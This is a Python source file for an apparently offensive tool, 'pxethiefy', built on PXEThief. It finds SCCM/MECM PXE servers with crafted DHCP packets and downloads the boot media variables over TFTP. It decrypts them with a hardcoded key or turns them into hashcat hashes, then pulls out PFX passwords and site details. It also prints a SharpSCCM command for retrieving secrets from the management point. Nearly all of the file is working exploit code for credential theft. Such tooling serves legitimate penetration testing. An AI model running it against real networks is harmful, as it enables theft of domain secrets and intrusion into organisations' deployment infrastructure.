#! /usr/bin/env python3

import sys
import argparse
import binascii
from hashlib import *
import math
import struct
from scapy.all import *
from Crypto.Cipher import AES,DES3
import lxml.etree as ET
import tftpy

from threading import Thread
from time import sleep

gVersion = "0.0.2"
## --------------------------------------------------------- ##

MSG_TYPE_NOCOLOR = ""
MSG_TYPE_NOPREFIX = ""
MSG_TYPE_DEFAULT = "\033[1m"
MSG_TYPE_SUCCESS = "\033[32m"
MSG_TYPE_WARNING = "\033[93m"
MSG_TYPE_INFO = "\033[96m"
MSG_TYPE_ERROR = "\033[91m"
MSG_TYPE_END = "\033[0m"

def log(msg, msgType=MSG_TYPE_DEFAULT):
    prefix = "[*] "
    if( msgType == MSG_TYPE_NOPREFIX ):
        prefix = ""
    else:
        if( msgType == MSG_TYPE_SUCCESS or msgType == MSG_TYPE_INFO):
            prefix = "[+] "
        elif( msgType == MSG_TYPE_WARNING ):
            prefix = "[!] "
        elif( msgType == MSG_TYPE_ERROR ):
            prefix = "[-] "
    
    print("%s%s%s%s" %(
        msgType,
        prefix,
        msg,
        MSG_TYPE_END  
    ))

###
##  Credits to MWR-CyberSec
##  https://github.com/MWR-CyberSec/PXEThief/blob/main/media_variable_file_cryptography.py
###
def read_media_variable_file_header(filename):
    media_file = open(filename,'rb')
    media_data = media_file.read(40)
    return media_data

def read_media_variable_file(filename):
    media_file = open(filename,'rb')
    media_file.seek(24)
    media_data = media_file.read()
    return media_data[:-8]

def aes_des_key_derivation(password):    
    key_sha1 = sha1(password).digest()
    b0 = b""
    for x in key_sha1:
        b0 += bytes((x ^ 0x36,))
        
    b1 = b""
    for x in key_sha1:
        b1 += bytes((x ^ 0x5c,))
    # pad remaining bytes with the appropriate value
    b0 += b"\x36"*(64 - len(b0))
    b1 += b"\x5c"*(64 - len(b1))
    b0_sha1 = sha1(b0).digest()
    b1_sha1 = sha1(b1).digest()
    return b0_sha1 + b1_sha1

def aes128_decrypt(data,key):
    aes128 = AES.new(key, AES.MODE_CBC, b"\x00"*16)
    decrypted = aes128.decrypt(data)
    return decrypted.decode("utf-16-le")

def aes128_decrypt_raw(data,key):
    aes128 = AES.new(key, AES.MODE_CBC, b"\x00"*16)
    decrypted = aes128.decrypt(data)
    return decrypted

def derive_blank_decryption_key(encrypted_key):
    length = encrypted_key[0]
    encrypted_bytes = encrypted_key[1:1+length] # pull out 48 bytes that relate to the encrypted bytes in the DHCP response
    encrypted_bytes = encrypted_bytes[20:-12] # isolate encrypted data bytes
    key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9' #Harcoded in tspxe.dll
    key = aes_des_key_derivation(key_data) # Derive key to decrypt key bytes in the DHCP response
    var_file_key = (aes128_decrypt_raw(encrypted_bytes[:16],key[:16])[:10]) 
    LEADING_BIT_MASK =  b'\x80'
    new_key = bytearray()
    for byte in struct.unpack('10c',var_file_key):
        if (LEADING_BIT_MASK[0] & byte[0]) == 128:
            new_key = new_key + byte + b'\xFF'
        else:
            new_key = new_key + byte + b'\x00'
    
    return new_key

def decrypt_media_file(path, password):
    password_is_string = True
    print("[+] Media variables file to decrypt: " + path)
    if type(password) == str:
        password_is_string = True
        print("[+] Password provided: " + password)
    else:
        password_is_string = False
        print("[+] Password bytes provided: 0x" + password.hex())

    # Decrypt encryted media variables file
    encrypted_file = read_media_variable_file(path) 
    try:
        if password_is_string:
            key = aes_des_key_derivation(password.encode("utf-16-le"))
        else:
            key = aes_des_key_derivation(password)
        last_16 = math.floor(len(encrypted_file)/16)*16
        decrypted_media_file = aes128_decrypt(encrypted_file[:last_16],key[:16])
        decrypted_media_file =  decrypted_media_file[:decrypted_media_file.rfind('\x00')]
        wf_decrypted_ts = "".join(c for c in decrypted_media_file if c.isprintable())
        log("Successfully decrypted media variables file with the provided password!", MSG_TYPE_SUCCESS)
    except:
        log("Failed to decrypt media variables file. Check the password provided is correct", MSG_TYPE_ERROR)
        return None
    
    return wf_decrypted_ts


def start_sniffing(sniff_filter, timeout=10, count=100):
    global packets
    packets = sniff(filter=sniff_filter, timeout=timeout, count=count)

###
##  Credits to MWR-CyberSec
##  https://github.com/MWR-CyberSec/PXEThief/blob/main/pxethief.py#L199-L269
###

def extract_boot_files(variables_file, dhcp_options):
    bcd_file, encrypted_key = (None, None)
    if variables_file:
        packet_type = variables_file[0] #First byte of the option data determines the type of data that follows
        data_length = variables_file[1] #Second byte of the option data is the length of data that follows

        #If the first byte is set to 1, this is the location of the encrypted media file on the TFTP server (variables.dat)
        if packet_type == 1:
            #Skip first two bytes of option and copy the file name by data_length
            variables_file = variables_file[2:2+data_length] 
            variables_file = variables_file.decode('utf-8')
        #If the first byte is set to 2, this is the encrypted key stream that is used to encrypt the media file. The location of the media file follows later in the option field
        elif packet_type == 2:
            #Skip first two bytes of option and copy the encrypted data by data_length
            encrypted_key = variables_file[2:2+data_length]
            
            #Get the index of data_length of the variables file name string in the option, and index of where the string begins
            string_length_index = 2 + data_length + 1
            beginning_of_string_index = 2 + data_length + 2

            #Read out string length
            string_length = variables_file[string_length_index]

            #Read out variables.dat file name and decode to utf-8 string
            variables_file = variables_file[beginning_of_string_index:beginning_of_string_index+string_length]
            variables_file = variables_file.decode('utf-8')
        bcd_file = next(opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 252).rstrip(b"\0").decode("utf-8")  # DHCP option 252 is used by SCCM to send the BCD file location
    else:
        log("No variable file location (DHCP option 243) found in the received packet when the PXE boot server was prompted for a download location", MSG_TYPE_ERROR)
    
    return [variables_file,bcd_file,encrypted_key]

def request_boot_files_from_ip(tftpServerIP):
    variables_file, bcd_file, encrypted_key = (None, None, None)
    
    log(f"Sending DHCP request to fetch PXE boot files at: {tftpServerIP}", MSG_TYPE_DEFAULT)
    log(f"--- Scapy output ---", MSG_TYPE_NOPREFIX)
    pkt = IP(dst=tftpServerIP)/UDP(sport=68,dport=4011)/BOOTP()/DHCP(options=[
    ("message-type","request"),
    ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
    ('pxe_client_architecture', b'\x00\x00'), #x86 architecture
    (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")), #x64 private option
    #(250,binascii.unhexlify("0d0208000e010101020006050400000006ff")), #x86 private option
    ('vendor_class_id', b'PXEClient'), 
    ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'), #included by the client, but doesn't seem to be necessary in WDS PXE server configurations
    "end"])
    
    # Start the sniffing a separate thread
    sniff_thread = Thread(target=start_sniffing, args=("udp port 4011 or udp port 68",))
    sniff_thread.start()
    # Wait some seconds to get the sniffing thread up and running
    sleep(2)
    ## Send packet
    ans = send(pkt)
    # Wait for the sniffing thread to complete
    sniff_thread.join()

    option_number, dhcp_options = (None, None)
    if(packets):
        for packet in packets:
            try:
                raw_data = packet[Raw].load
                bootp_layer = BOOTP(raw_data)
                dhcp_layer = bootp_layer[DHCP]
                dhcp_options = dhcp_layer[DHCP].options
                option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243)
            except:
                pass
    else:
        log("No DHCP responses recieved from MECM server. This may indicate that the wrong IP address was provided or that there are firewall restrictions blocking DHCP packets to the required ports", MSG_TYPE_ERROR)

    if(variables_file and dhcp_options):
        variables_file,bcd_file,encrypted_key = extract_boot_files(variables_file, dhcp_options)

    return [variables_file, bcd_file, encrypted_key]
    

def request_boot_files_with_interface(interface, clientIPAddress, clientMacAddress, tftpServerIP):
    variables_file, bcd_file, encrypted_key = (None, None, None)

    log(f"Sending DHCP request to fetch PXE boot files at: {tftpServerIP}", MSG_TYPE_DEFAULT)
    log(f"--- Scapy output ---", MSG_TYPE_NOPREFIX)
    #Media Variable file is generated by sending DHCP request packet to port 4011 on a PXE enabled DP. This contains DHCP options 60, 93, 97 and 250
    pkt = IP(src=clientIPAddress,dst=tftpServerIP)/UDP(sport=68,dport=4011)/BOOTP(ciaddr=clientIPAddress,chaddr=clientMacAddress)/DHCP(options=[
    ("message-type","request"),
    ('param_req_list',[3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135]),
    ('pxe_client_architecture', b'\x00\x00'), #x86 architecture
    (250,binascii.unhexlify("0c01010d020800010200070e0101050400000011ff")), #x64 private option
    #(250,binascii.unhexlify("0d0208000e010101020006050400000006ff")), #x86 private option
    ('vendor_class_id', b'PXEClient'), 
    ('pxe_client_machine_identifier', b'\x00*\x8cM\x9d\xc1lBA\x83\x87\xef\xc6\xd8s\xc6\xd2'), #included by the client, but doesn't seem to be necessary in WDS PXE server configurations
    "end"])
    
    answer = sr1(pkt,timeout=10,iface=interface,verbose=2,filter="udp port 4011 or udp port 68") # sr return value: ans,unans/packetpair1,packetpair2 (i.e. PacketPairList)/sent packet,received packet/Layers(Ethernet,IP,UDP/TCP,BOOTP,DHCP)
    encrypted_key = None
    log(f"--- Scapy output end ---", MSG_TYPE_NOPREFIX)
    if answer:
        try:
            dhcp_options = answer[1][DHCP].options
            #Does the received packet contain DHCP Option 243? DHCP option 243 is used by SCCM to send the variable file location
            option_number, variables_file = next(opt for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == 243)
            if(variables_file and dhcp_options):
                [variables_file,bcd_file,encrypted_key] = extract_boot_files(variables_file, dhcp_options)
        except:
            pass
    else:
        log("No DHCP responses recieved from MECM server. This may indicate that the wrong IP address was provided or that there are firewall restrictions blocking DHCP packets to the required ports", MSG_TYPE_ERROR)

    return [variables_file,bcd_file,encrypted_key]

def find_pxe_boot_servers(interface, clientMacAddress):
    ## Find PXE Servers
    pxe_server = []
    log(f"Sending DHCP discover request to search for PXE servers...", MSG_TYPE_DEFAULT)
    log(f"--- Scapy output ---", MSG_TYPE_NOPREFIX)
    #   DHCP Option 93
    #    0000 == IA x86 PC (BIOS boot)
    #    0006 == x86 EFI boot
    #    0007 == x64 EFI boot
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68, dport=67)/BOOTP(chaddr=clientMacAddress)/DHCP(options=[("message-type", "request"), ("vendor_class_id", "PXEClient"), (93, b"\x00\x00"), "end"])

    # Start the sniffing a separate thread
    sniff_thread = Thread(target=start_sniffing, args=("udp and dst host 255.255.255.255",))
    sniff_thread.start()
    
    ## Wait some seconds to get the sniffing thread up and running
    sleep(2)

    ## Send packet
    sendp(pkt, iface=interface)

    # Wait for the sniffing thread to complete
    sniff_thread.join()
    log(f"--- Scapy output end ---", MSG_TYPE_NOPREFIX)
    for packet in packets:
        dhcp_options = packet[DHCP].options
        dhcp_server_ip = next((opt[1] for opt in dhcp_options if isinstance(opt, tuple) and opt[0] == "server_id"),None)
        if(dhcp_server_ip):
            pxe_server.append(dhcp_server_ip)

    return pxe_server

def process_pxe_media_xml(media_xml):
    #Parse media file in order to pull out PFX password and PFX bytes
    try:
        root = ET.fromstring(media_xml.encode("utf-16-le"))
        smsMediaGuid = root.find('.//var[@name="_SMSMediaGuid"]').text 
        smsTSMediaPFX = root.find('.//var[@name="_SMSTSMediaPFX"]').text
        smsManagementPoint = root.find('.//var[@name="SMSTSMP"]').text
        smsManagementPointDNS = smsManagementPoint.replace("http://", "").replace("https://", "")
        smsSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text
        smsMachineGuidUnknownX64 = root.find('.//var[@name="_SMSTSx64UnknownMachineGUID"]').text

        log(f"Management Point: {smsManagementPoint}", MSG_TYPE_INFO)
        log(f"Site Code: {smsSiteCode}", MSG_TYPE_INFO)
        log(f"You can use the following information with SharpSCCM in an attempt to obtain secrets from the Management Point..\n  SharpSCCM.exe get secrets -i \"{{{smsMachineGuidUnknownX64}}}\" -m \"{smsMediaGuid}\" -c \"{smsTSMediaPFX}\" -sc {smsSiteCode} -mp {smsManagementPointDNS}", MSG_TYPE_INFO)
    except Exception as ex:
        log("Error while trying to process media xml...", MSG_TYPE_ERROR)

def loot_boot_files(tftp_server, variables_file, bcd_file, encrypted_key):
    
    log(f"Variables File Location: {variables_file}", MSG_TYPE_DEFAULT)
    log(f"BCD File Location: {bcd_file}", MSG_TYPE_DEFAULT)

    ## Downloading variables file
    log(f"Downloading var file '{variables_file}' from TFTP server '{tftp_server}'", MSG_TYPE_DEFAULT)
    client = tftpy.TftpClient(tftp_server, 69)
    local_variable_files_name = variables_file.split("\\")[-1]
    client.download(variables_file, local_variable_files_name)

    ## Decrypt media or create hash for cracking
    if(encrypted_key):
        log("Blank password on PXE media file found!", MSG_TYPE_SUCCESS)
        log("Attempting to decrypt it...", MSG_TYPE_DEFAULT)
        decrypt_password = derive_blank_decryption_key(encrypted_key)
        if( decrypt_password ):
            media_variables = decrypt_media_file(local_variable_files_name,decrypt_password)
            if( media_variables ):
                process_pxe_media_xml(media_variables)
    else:
        log("PXE boot media is encrypted with custom password", MSG_TYPE_DEFAULT)
        log("Creating hash to crack it...", MSG_TYPE_DEFAULT)
        media_file_hash = read_media_variable_file_header(local_variable_files_name).hex()
        hashcat_hash = f"$sccm$aes128${media_file_hash}"
        log(f"Got the hash: {hashcat_hash}", MSG_TYPE_SUCCESS)
        log(f"  Try cracking this hash to read the media file", MSG_TYPE_NOPREFIX)
        log(f"  Use this hashcat module: https://github.com/MWR-CyberSec/configmgr-cryptderivekey-hashcat-module", MSG_TYPE_NOPREFIX)

def loot_ip_address(dp_ip_addr_str):
    log(f"Querying Distribution Point: {dp_ip_addr_str}", MSG_TYPE_DEFAULT)
    variables_file, bcd_file, encrypted_key = request_boot_files_from_ip(dp_ip_addr_str)
    if(variables_file):
        loot_boot_files(dp_ip_addr_str, variables_file, bcd_file, encrypted_key)

def find_and_loot(interface, dp_ip_addr_str=None):
    # Make Scapy aware that, indeed, DHCP traffic *can* come from source or destination port udp/4011 - the additional port used by MECM
    bind_layers(UDP,BOOTP,dport=4011,sport=68)
    bind_layers(UDP,BOOTP,dport=68,sport=4011)

    try:
        _,client_mac_addr = get_if_raw_hwaddr(interface)
        client_mac_addr_str = ':'.join(client_mac_addr.hex()[i:i+2] for i in range(0, len(client_mac_addr.hex()), 2))
        client_ip_addr = get_if_addr(interface)
    except Exception as ex:
        log(f"An error occured while trying to get MAC/IP from interface '{interface}'...\n  Error was: {ex}", MSG_TYPE_ERROR)
        sys.exit()

    log(f"Using Interface: {interface}", MSG_TYPE_DEFAULT)
    log(f"  IP: {client_ip_addr}", MSG_TYPE_DEFAULT)
    log(f"  MAC: {client_mac_addr_str}", MSG_TYPE_DEFAULT)

    tftp_servers = find_pxe_boot_servers(interface, client_mac_addr)
    
    for tftp_server in tftp_servers:
        ## Looking for media
        log(f"Found server offering PXE media: {tftp_servers}", MSG_TYPE_SUCCESS)
        log(f"Looking for PXE media files...", MSG_TYPE_DEFAULT)
        variables_file, bcd_file, encrypted_key = request_boot_files_with_interface(interface, client_ip_addr, client_mac_addr, tftp_server)
        if(variables_file):
            loot_boot_files(tftp_server, variables_file, bcd_file, encrypted_key)

def print_banner():
   print(rf""" 
 ________  ___    ___ _______  _________  ___  ___  ___  _______   ________ ___    ___ 
|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\\  \  /  /|
\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/\ \  \/  / /
 \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\\ \    / / 
  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_| \/  /  /  
   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\__/  / /    
    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|\___/ /     
          |__|/ \|__|                                                     \|___|/      
                                                                                       v.{gVersion}
                                                Based on the original PXEThief by MWR-CyberSec
                                                     https://github.com/MWR-CyberSec/PXEThief/
""")

def main():
    print_banner()
    ### ARG parser
    parser = argparse.ArgumentParser(description="""
[**] Examples: 
    pxethiefy.py explore -i eth0
    pxethiefy.py explore -i eth0 -a 192.0.2.50                    
    pxethiefy.py decrypt -p "password" -f ./2023.05.05.10.43.44.0001.{85CA0850-35DC-4A1F-A0B8-8A546B317DD1}.boot.var
""", formatter_class=argparse.RawTextHelpFormatter)
    subparsers = parser.add_subparsers(title='subcommands', dest="subcommands")
    ## Find and loot
    find_and_loot_parser = subparsers.add_parser('explore', formatter_class=argparse.RawTextHelpFormatter, description="""
[**] Query for PXE servers and media on the network
[**] Examples: 
    pxethiefy.py explore -i eth0
    pxethiefy.py explore -a 192.0.2.50
""", help="Query for PXE servers and media on the network")
    find_and_loot_parser.add_argument('-a', '--address', required=False, type=str, dest='dp_ip_addr_str', help="Specify the IP address of a PXE-enabled distribution point instead of discovering on network..")
    find_and_loot_parser.add_argument('-i', '--interface', required=False, type=str, dest='interface', help="Interface to use to search for PXE servers..")
    ## Decrypt
    decrypt_parser = subparsers.add_parser('decrypt', formatter_class=argparse.RawTextHelpFormatter, description="""
[**] Decrypt media downloaded in 'explore' step with cracked password
[**] Example: 
    pxethiefy.py decrypt -p "password" -f ./2023.05.05.10.43.44.0001.{85CA0850-35DC-4A1F-A0B8-8A546B317DD1}.boot.var
""", help="Decrypt media downloaded in 'explore' step with cracked password")
    decrypt_parser.add_argument('-p', '--password', required=True, type=str, dest='password', help="Cracked password to decrypt media file")
    decrypt_parser.add_argument('-f', '--media-file', required=True, type=str, dest='mediafile', help="Path to downloaded media file")
    
    args = parser.parse_args()

    ## Find and loot
    if( args.subcommands == 'explore'):
        if (args.dp_ip_addr_str):
            loot_ip_address(args.dp_ip_addr_str)
        elif (args.interface):
            find_and_loot(args.interface)
        else:
            find_and_loot_parser.print_help()
    
    ## Decrypt
    elif( args.subcommands == 'decrypt'):
        if( args.mediafile and args.password ):
            media_variables = decrypt_media_file(args.mediafile, args.password)
            if( media_variables ):
                process_pxe_media_xml(media_variables)
        else:
            decrypt_parser.print_help()
    
    else:
        parser.print_help()

if __name__ == '__main__':
    if sys.version_info<(3,0,0):
        sys.stderr.write("You need python 3.0 or later to run this script\n")
        sys.exit(1)
    try:
        main()
    except KeyboardInterrupt:
        # quit
        sys.exit()